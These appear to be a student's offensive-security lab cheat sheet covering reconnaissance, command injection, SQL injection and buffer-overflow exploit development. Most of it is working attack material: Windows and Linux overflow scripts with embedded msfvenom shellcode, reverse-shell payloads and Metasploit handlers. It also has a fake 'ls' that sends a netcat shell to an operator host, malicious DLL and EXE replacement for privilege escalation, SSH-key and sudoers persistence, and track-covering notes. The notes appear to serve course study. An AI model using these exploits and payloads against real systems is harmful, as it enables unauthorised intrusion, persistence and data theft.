NMAP SCRIPTS
  /usr/share/nmap/scripts
smb-os-discovery
http-enum

                                      ###RDP TUNNEL###
ssh -S /tmp/data data -O forward -L 9999:192.168.28.9:3389                         
xfreerdp /v:127.0.0.1:9999 /u:comrade /glyph-cache /clipboard /dynamic-resolution

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
COMMAND INJECTION
Begin all new commands with a ;                           #LOOK FOR FIELDS THAT LOOK LIKE THEY MIGHT BE RUNNING COMMANDS IN THE BACKGROUND, PING, ETC
UPLOAD SSH KEY TO WEB SERVER:
  ; whoami                                                #FIND OUT WHO YOU ARE
  ; cat /etc/passwd                                       #FIND HOME DIRECTORY
  ssh-keygen                                              #CREATE SSH KEY
  cat /home/student/.ssh/id_rsa.pub                       #LOOK AT PUBLIC SSH KEY
  ; mkdir /var/www/.ssh                                   #MAKE .ssh directory
  ; echo "COPIED KEY" >> /var/www/.ssh/authorized_keys    #ECHO YOUR KEY INTO THE .ssh DIRECTORY

      ###Directory Traversal VIA###

URL
FILE SEARCHING
CALL A FUNCTION USING THE DEV TOOLS CONSOLE ()



      ###EASY-5STEP SQL INJECTION###

  1. Identify Vulnerable Fields
  2. Identify # of Columns w/ Golden Statement
  3. Edit Golden Statement
  4. Craft Query
  5. Get Money/Points

FOR GET REQUEST via URL SEND TRUE OF FALSE STATEMENT THEN VIEW POST REQUEST IN WEB DEV TOOLS, PUT A QUESTION MARK IN URL AND COPY AND PASTE RAW DATA SENT IN POST 
tom' OR 1='1
username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271 ->                               URL....php?username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271
                                                                                                      CHEAT CODE FOR USERNAME AS PASSWORD FIELDS


          ###POST METHOD###
StudentPrivPassword
  Ford' OR 1='1                       #DID NOT WORK
  Dodge' OR 1='1                      #DID NOT WORK
  Honda' OR 1='1                      #DID NOT WORK
  Audi' OR 1='1                       #THIS ONE WORKED
  Audi' UNION SELECT 1,2,3,4; #
  Audi' UNION SELECT 1,2,3,4,5; #
  Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
  Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires; #
  Audi' UNION SELECT id,2,name,pass,5 FROM session.user; #
  Audi 'UNION SELECT @@version,2,3,4,5; #            #SQL VERSION


         ###GET METHOD USING URL###

  http://10.50.35.49/uniondemo.php?Selection=1 OR 1=1                #SELECTION 1 DID NOT WORK
  http://10.50.35.49/uniondemo.php?Selection=2 OR 1=1                #SELECTION 2 DID WORK
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT 1,2,3
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT% 1,2,@@version      #GETS SQL VERSION

Hacker' ,cook',cook',1) # \
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
          ###REVERSE ENGINEERING###
main: 
  mov rax, 16                      //move into rax the value of 16                                      
  push rax                         //push value of rax (16) onto the stack. stack grows by 8 bytes
  jmp mem2                         //jump to memory location of mem2

mem1:
  mov rax, 0                       //move into rax the value of 0
  ret                              //return value of rax (first return register)(0)

mem2:
  pop r8                           //pop value from top of the stack (16) into r8, r8 is 16. stack shrinks by 8 bytes
  cmp rax, r8                      //compare to the value of rax (16) to the value of r8 (16). r8 is subtracted from rax.
  je mem1                          //zero flag is set from previous operation; values are equal. jmp to mem location of mem1
----------------------------------------------------------------------------------------------------------------------------
main:
  mov rcx, 25                      //move into rcx, the value of 25
  mov rbx, 62                      //move into rbx, the value of 62
  jump mem1                        //jump to memory location of mem1

mem1:
  sub rbx, 40                      //subtract from rbx(62) the value of 40. rbx is now 22
  mov rsi, rbx                     //move into rsi the value of rbx(22)
  cmp rcx, rsi                     //compare to rcx(25) the value of rsi(22). rsi is subtracted from rcx. flag is set.
  jle mem2                         //flag is set. jump to memory location of mem2

mem2:
  mov rax, 0                       //move into rax the value of 0
  ret                              //return the value of rax (first return register)(0)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

          ###EXPLOIT DEVELOPEMENT###
(WINDOWS)  

RUN .EXE AND SEE THAT IT OPENS PORT, USE LIN_OPS TO CONNECT TO PORT AND INTERACT WITH EXE
USE GHIDRA TO PERFROM ANALYSIS OF .EXE, FIND VULNERABLE FUNCTION

!mona modules
!mona jump -r esp -m "essfunc.dll"
Window -> Log Data Drop Down
msfvenom -p windows/shell/reverse_tcp lhost=10.50.20.72 lport=21001 -b "\x00" -f python           #USE PORT 21001 WHEN USING MULTI/HANDLER
msfconsole
use multi/hander
set payload windows/meterpreter/reverse_tcp
show options
set lhost 0.0.0.0
set lport 21001
run

#!/usr/bin/env python
import socket
#0x625012A0 -> 0x62 50 12 a0 -> "\xa0\x12\x50\x62"
#0x625012AD -> 0x62 50 12 ad -> "\xad\x12\x50\x62"
#0x625012BA -> 0x62 50 12 ba -> "\xba\x12\x50\x62"
#0x625012C7 -> 0x62 50 12 c7 -> "\xc7\x12\x50\x62"

buf = "TRUN /.:/"
buf += "A" * 2003
buf += "\xa0\x12\x50\x62"
buf += "\x90" * 15
buf += b"\xb8\xbb\x1c\x7d\xfd\xdb\xd1\xd9\x74\x24\xf4\x5a"
buf += b"\x31\xc9\xb1\x59\x83\xea\xfc\x31\x42\x10\x03\x42"
buf += b"\x10\x59\xe9\x81\x15\x12\x12\x7a\xe6\x4c\x22\xa8"
buf += b"\x82\x07\x16\x7c\xc0\x45\x9b\xf7\x84\x7d\x2a\xe2"
buf += b"\x26\xca\x66\xcb\xb3\x46\x5f\x22\x3b\x97\x5f\xe8"
buf += b"\xff\xb6\x23\xf3\xd3\x18\x1d\x3c\x26\x59\x5a\x8a"
buf += b"\x4c\xb6\x36\x5a\x24\x1a\xa7\xef\x78\xa6\xc6\x3f"
buf += b"\xf7\x96\xb0\x3a\xc8\x62\x0d\x44\x19\x01\xd5\x66"
buf += b"\xc9\x14\x35\xed\xa1\x0e\x3c\x3b\x45\x12\x0f\x43"
buf += b"\xef\xe1\x5b\x30\xf1\x23\x92\x86\x5e\x0a\x1a\x0b"
buf += b"\x9e\x4b\x9d\xf4\xd5\xa7\xdd\x89\xed\x7c\x9f\x55"
buf += b"\x7b\x62\x07\x1d\xdb\x46\xb9\xf2\xba\x0d\xb5\xbf"
buf += b"\xc9\x49\xda\x3e\x1d\xe2\xe6\xcb\xa0\x24\x6f\x8f"
buf += b"\x86\xe0\x2b\x4b\xa6\xb1\x91\x3a\xd7\xa1\x7e\xe2"
buf += b"\x7d\xaa\x6d\xf5\x02\x53\x6e\xfa\x5e\xc3\xa2\x37"
buf += b"\x61\x13\xad\x40\x12\x21\x72\xfb\xbc\x09\xfb\x25"
buf += b"\x3a\x18\xeb\xd5\x94\xa2\x7c\x28\x15\xd2\x55\xef"
buf += b"\x41\x82\xcd\xc6\xe9\x49\x0e\xe6\x3f\xe7\x04\x70"
buf += b"\xca\xc5\x0c\xc8\xa2\x2b\x2d\x9a\x3b\xa2\xcb\x4a"
buf += b"\x6c\xe4\x43\x2b\xdc\x44\x34\xc3\x36\x4b\x6b\xf3"
buf += b"\x38\x86\x04\x9e\xd6\x7e\x7c\x37\x4e\xdb\xf6\xa6"
buf += b"\x8f\xf6\x72\xe8\x04\xf2\x83\xa7\xec\x77\x90\xd0"
buf += b"\x8a\x77\x68\x21\x3f\x77\x02\x25\xe9\x20\xba\x27"
buf += b"\xcc\x06\x65\xd7\x3b\x15\x62\x27\xba\x2f\x18\x1e"
buf += b"\x28\x0f\x76\x5f\xbc\x8f\x86\x09\xd6\x8f\xee\xed"
buf += b"\x82\xdc\x0b\xf2\x1e\x71\x80\x67\xa1\x23\x74\x2f"
buf += b"\xc9\xc9\xa3\x07\x56\x32\x86\x1b\x91\xcc\x54\x34"
buf += b"\x3a\xa4\xa6\x04\xba\x34\xcd\x84\xea\x5c\x1a\xaa"
buf += b"\x05\xac\xe3\x61\x4e\xa4\x6e\xe4\x3c\x55\x6e\x2d"
buf += b"\xe0\xcb\x6f\xc2\x39\xfc\x0a\xab\xbe\xfd\xea\xa5"
buf += b"\xda\xfe\xea\xc9\xdc\xc3\x3c\xf0\xaa\x02\xfd\x47"
buf += b"\xa4\x31\xa0\xee\x2f\x39\xf6\xf1\x65"


s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.50.29.152", 9999))
print s.recv(1024)
s.send(buf)
print s.recv(1024)

s.close()
----------------------------------------------------------------------------------------------------------------------------
         ###LINUX EXPLOIT###
(escalation.py)
#!/usr/bin/env python
#0xf7df1b51 -> 0xf7 df 1b 51 -> "\x51\x1b\xdf\xf7"
#0xf7f6674b -> 0xf7 f6 67 4b -> "\x4b\x67\xf6\xf7"
#0xf7f72753 -> 0xf7 f7 27 53 -> "\x53\x27\xf7\xf7"
#0xf7f72c6b -> 0xf7 f7 2c 6b -> "\x6b\x2c\xf7\xf7"
buffer = "A" * 76
eip = "\x51\x1b\xdf\xf7"
nop = '\x90' * 15
buf =  b""
buf += b"\xda\xd8\xd9\x74\x24\xf4\x58\x29\xc9\xb1\x10\xbb"
buf += b"\x95\xb8\x84\xe0\x31\x58\x17\x03\x58\x17\x83\x55"
buf += b"\xbc\x66\x15\x3f\xb6\x3e\x4f\xed\xae\xd6\x42\x72"
buf += b"\xa6\xc0\xf5\x5b\xcb\x66\x06\xcb\x04\x15\x6f\x65"
buf += b"\xd2\x3a\x3d\x91\xfd\xbc\xc2\x61\xd1\x92\xb1\x04"
buf += b"\x4e\x99\x50\xb2\xbf\x73\xed\x5f\xb2\xf2\x62\xfa"
buf += b"\x51\x77\xe0\x70\xb8\x07\x8e\x1a\xc4\xb0\x1d\x53"
buf += b"\x25\xf3\x22"
print(buffer+eip+nop+buf)
sudo /.hidden/inventory.exe <<<$(./escalation.py)
  msfconsole
use payload/linux/x86/exec
set CMD "/.secret/.verysecret.pdb"
generate -b '\x00' -f python
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    ###LINUX PRIVLEDGE ESCALATION, PERSISTENCE, AND COVERING YOUR TRACKS###
GTFO bins to see what commands you have sudo access to can be used to possibly escalate prviledges.
(1) sudo         
  -l      #LIST ALL SUDO COMMANDS YOU CAN DO
  -u      #RUN COMMANDS AS SOMEONE ELSE

(2) find / -type f -perm /4000 -ls 2>/dev/null   #FINDS ALL FILES WITH SUID BIT SET
    find / -type f -perm /2000 -ls 2>/dev/null   #FINDS ALL FILES WITH SGID BET SET
    find / -type f -perm /6000 -ls 2>/dev/null   #FINDS BOTH
(3)
    Check Binaries found against gtfo database to see what might work for privledge escalation.
    https://gtfobins.github.io/#
----------------------------------------------------------------------------------------------------------------------------
        ###INSECURE PERMISSIONS###
CRON STUFF
 /etc/crontab              #SYSTEM LEVEL SCHEDULED JOBS
 /var/spool/cron/crontab   #USER LEVEL SCHEDULED JOBS

crontab 
  -l                 #LISTS CRON JOBS FOR CURRENT USER
  -e                 #ALLOWS EDITING OF CRON TABLE/CREATING A JOB
  -r                 #USED TO REMOVED A CRON JOB
  -u                 #USED TO VIEW CRON JOBS OF ANOTHER USER
crontab.guru
----------------------------------------------------------------------------------------------------------------------------
       ###WORLD WRITEABLE FILES AND FOLDERS###
  find / -type d -perm /2 -ls 2>/dev/null      #FINDS WORLD WRITEABLE DIRECTORIES
  find / -type f -perm /2 -ls 2>/dev/null      #FINDS WORLD WRITEABLE FILES
  /var/tmp
  /tmp
  ls -laitr
  -l  #LONG LISTING
  -a  #ALL FILES
  -i  #INODE NUMBEr
  -t  #TIME
  -r  #REVERSE
----------------------------------------------------------------------------------------------------------------------------
    ###COVERING TRACKS###
ps -p 1    #FIND OUT WHAT SYSTEM INIT IS BEING USED
  #BEFORE CLEANING LOGS SAVE INODE NUMBER


. IN THE PATH
cd `printf "/var/tmp\n/tmp\n"|sort -R | head -n 1`;ls

(script uses ls to print directory contents of /tmp or /var/tmp, create a script named ls in both directories that sends a shell over the network to your op station)

@lin_ops  nc -lvp 4545

@lin2  !#/bin/bash
@lin2  nc -c /bin/bash 10.50.20.72 4545

/etc/sudoers
comrade ALL=(ALL:ALL) ALL    #ALLOWS COMRADE TO SUDO EVERYTHING
----------------------------------------------------------------------------------------------------------------------------
        ###WINDOWS PRIVLEDGE ESCELATION###

       ###Finding vulnerable Scheduled Tasks###
GUI Task Scheduler
schtasks /query /fo LIST /v
        ###FINDING VULNERABLE SERVICES####
GUI Services
sc query
Filter on Descriptions

###MALICIOUS DLL###
(1) Services                #SORT BY DESCRIPTION AND FIND ONE WITH NO DESCRIPTION OR AN UNPROFESSIONAL ONE
(2) Open Procmon and find what .dll is NAME NOT FOUND in a place that we have write permissions
(3) Create malicous .dll | msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll
(4) scp it to windows target and run the service (or restart box)

msfvenom -p windows/shell/reverse_tcp LHOST=10.50.20.72 LPORT=6969 -f dll > hijackmeplz.dll
msfconsole
use multi/handlder
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 6969

###REPLACING EXE###
(1) Try to rename .exe being ran
(2) Create new exe |  msfvenom -p windows/exec CMD='cmd.exe /C "hostname" > C:\Users\student\Desktop\hostname.txt' -f exe > putty.exe
                      msfvenom -p windows/shell/reverse_tcp LHOST=<WINOPS> LPORT=<LIN_OPS_PORT> -f exe > putty.exe         #USE MULTI/HANDLER TO CONNECT
(3) scp it to windows target and run service (or restart box)

###VIEWING AUDITING POLICY###
auditpol /get /category:* | findstr /i "success failure"
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
      ###DRY RUN NOTES###
 for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done #PING SCRIPT   #MAKE SURE YOU HAVE A BASH SHELL /bin/bash
https://app.diagrams.net/                             #MAP SOFTWARE
----------------------------------------------------------------------------------------------------------------------------
                                      ###DONE IN THE URL###
http://127.0.0.1:1111/pick.php?product=1 OR 1=1
http://127.0.0.1:1111/pick.php?product=2 OR 1=1
http://127.0.0.1:1111/pick.php?product=3 OR 1=1
http://127.0.0.1:1111/pick.php?product=4 OR 1=1
http://127.0.0.1:1111/pick.php?product=5 OR 1=1
http://127.0.0.1:1111/pick.php?product=6 OR 1=1
http://127.0.0.1:1111/pick.php?product=7 OR 1=1                                                                            #TRUTH STATEMENT WORKS
http://127.0.0.1:1111/pick.php?product=7 UNION SELECT 1,2,3                                                                #GIVES THE 3 COLUMN NAMES IN ORDER 1,3,2
http://127.0.0.1:1111/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
                                                            1            3          2
http://127.0.0.1:1111/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users                           #USER DATA ROT13 ENCRYPTED POSSIBLE

###IF BOX HAS PORT 9999 CHECK FOR SERCURESERVER TO DO WINDOWS BUFFER OVERFLOW EXPLOIT###
----------------------------------------------------------------------------------------------------------------------------

(1) Scan First Potential Box | nmap -Pn -sV -T5 <targetip>
(2) Make Tunnel To HTTP Port and Enumerate Website to Find Possible Vulnerable Input Fields
(3) POST METHOD: Username: ' OR 1='1                                                                         #RETURNS FIRST USER WHERE USERNAME AND PASSWORD IS TRUE
                 Password: ' OR 1='1
(4) GET METHOD:  RESEND TRUTH STATEMENT WITH WEB DEV TOOLS, CLICK ON POST REQUEST AND SWITCH DATA TO RAW:    #ROT 13 ENCRYPTED PASSORDS POSSIBLE
                 http://10.10.10.10/login.php?username=' OR 1='1 & passwd=' OR 1='1
(5) CHECK FOR robots.txt
(6) RUN nmap --scipt=http-enum
(7) DECODE PASSWORDS
(8) CREATE CONTROL SOCKET TO PUBLIC FACING WEB SERVER
    ssh -MS /tmp/pub user2@10.10.10.10
(9) ENUMERATE | sudo -l | cat /etc/hosts | cd | find / -type f -perm /6000 -ls 2>/dev/null | ip a | ip r | ip n
(10) cat /etc/hosts | for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done | SCAN NETWORK THAT DISCOVERED HOST WAS ON
(11) CREATE DYNAMIC PORT TO BE ABLE TO SCAN DISCOVERED HOSTS
(12) SCAN DISCOVERED HOSTS WITH NMAP TO DISCOVER PORTS | nmap -Pn -T5 -Sv -vvvv 192.168.28.172,181
(13) CREATE PORT FORWARDS TO NEWLY DISCOVERED HOSTS AND THEIR ASSOICIATED PORTS
(14) GET ONTO BOX AND ENUMERATE | sudo -l | cat /etc/hosts | cd | find / -type f -perm /6000 -ls 2>/dev/null | ip a | ip r | ping sweep scan

      ###CREATING LINUX BUFFER OVERFLOW###
strings func                                                   #RUN STRINGS ON THE EXE
file func                                                      #RUN FILE ON THE EXE
./func                                                         #DO DYNAMIC ANALYSIS OF THE EXECUTABLE BY RUNNING IT
./func $(fsdjfafada) | ./func <<<$(echo "dadaagfa")            #TEST MEDTHODS OF PASSING ARGUMENTS OR INPUT TO THE EXE $() & <<<$()
      ###START BUILDING SCRIPT###
#!/usr/bin/env python
buff = "A" * 40
print(buff)
chmod +x (script.py)

peda$ buff = "A" * 100                                               #INCREASE SIZE OF BUFFER UNTIL SEGMENTATION FAULT HAPPENS
peda$ gdb ./func                                                     #RUN gdb ON THE EXE
peda$ info functions                                                 #GET A BREAKDOWN OF THE FUNCTIONS
peda$ pdisass main                                                   #LOOK AT THE MAIN FUNCTION AND SEE THAT IT CALLS THE FUNCTION "getuserinput"
peda$ pdisass getuserinput                                           #LOOK AT THE GET USER INPUT FUNCTION
peda$ run <<<$(linbuff.py)

https://wiremask.eu/tools/buffer-overflow-pattern-generator/         #CREATE A RANDOM SEQUENCE OF CHARACTERS GREATER THAN THE LENTH USED TO BREAK
#!/usr/bin/env python                                                #THE EXE ONCE BROKEN RUN THE SCRIPT AGAIN IN GDB PEDA$ TO GET CORRECT EIP ADDRESS
#buff = "A" * 40                                                     #AND PUTTING IN BACK INTO WIREMASK TO GET THE BUFFER LENGTH
buff = "RANDOM LONG STRING OF CHARACTERS YOU GOT FROM WIREMASK"
print(buff)
peda$ run <<<$(linbuff.py)

#!/usr/bin/env python                                                 #CREATE THE EIP VARIABLE WITH A VALUE OF BBBB TO VERIFY CORRECT BUFFER LENGTH
buff = A * 62
eip = "BBBB"
print(buff+eip)
peda$ run <<<$(linbuff.py)

env - gdb ./func                                                      #CLEAN ENVIROMENT TO GET CORRECT EIP ADDRESS, WILL NEED TO BE DONE ON THE TARGET TO MAKE SURE YOU HAVE CORRECT EIP LOCATION
show env
unset env LINES
unset env COLUMNS
run                                                                   #BREAK THE EXE TO GET A SEGMENTATION FAULT
info proc map                                                         #GET THE FIRST ADDRESS AFTER THE HEAP AND THE LAST ONE IN THE STACK   0xf7de1000 to 0xffffe000
find /b 0xf7de1000,0xffffe000,0xff,0xe4
  first after heap | last in stack |

 #0xf7de3b59 -> 0xf7 de 3b 59 "\x59\x3b\xde\xf7"                       #TAKE THE FIRST 4 AND CONVERT TO LITTLE ENDIAN, STACK IS 0xf7de1000 TO 0xffffe000

msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
msfvenom -p <payload> <options> -b '\x00'-f python
 ###ADD NOP STATEMENT AND SHELLCODE TO SCRIPT### 
#!/usr/bin/env python
buff = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xdb\xd1\xd9\x74\x24\xf4\xbf\xf9\x75\x5f\x3b\x5d"
buf += b"\x2b\xc9\xb1\x0b\x31\x7d\x19\x03\x7d\x19\x83\xc5"
buf += b"\x04\x1b\x80\x35\x30\x83\xf2\x98\x20\x5b\x28\x7e"
buf += b"\x24\x7c\x5a\xaf\x45\xea\x9b\xc7\x86\x88\xf2\x79"
buf += b"\x50\xaf\x57\x6e\x65\x2f\x58\x6e\x1d\x47\x37\x0f"
buf += b"\x8c\xfe\xc7\x98\x1d\x89\x29\xeb\x22"



